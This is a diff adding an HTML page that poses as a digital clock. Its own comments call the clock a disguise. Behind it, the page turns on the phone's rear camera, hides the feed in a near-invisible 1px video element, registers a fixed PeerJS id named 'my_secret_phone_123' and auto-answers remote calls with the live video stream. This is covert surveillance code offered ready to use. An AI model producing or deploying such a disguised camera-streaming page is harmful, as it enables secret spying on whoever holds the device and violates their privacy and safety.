@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>数字时钟</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: black; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; }
+        #clock { font-size: 5rem; }
+        /* 关键：将视频画面隐藏 */
+        #video-preview { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+    </style>
+</head>
+<body>
+    <div id="clock">00:00:00</div>
+    <video id="video-preview" autoplay playsinline muted></video>
+
+    <script>
+        // 1. 更新时钟显示（伪装）
+        setInterval(() => {
+            const now = new Date();
+            document.getElementById('clock').innerText = now.toTimeString().split(' ')[0];
+        }, 1000);
+
+        // 2. 初始化 Peer (起一个你容易记住的名字，比如 my_secret_phone_123)
+        const peer = new Peer('my_secret_phone_123'); 
+
+        // 3. 启动摄像头并等待呼叫
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "environment" }, // 使用后置摄像头
+            audio: false 
+        }).then(stream => {
+            document.getElementById('video-preview').srcObject = stream;
+            
+            // 当电脑端“呼叫”时，自动应答并发送画面
+            peer.on('call', call => {
+                call.answer(stream);
+            });
+        });
+    </script>
+</body>
+</html>
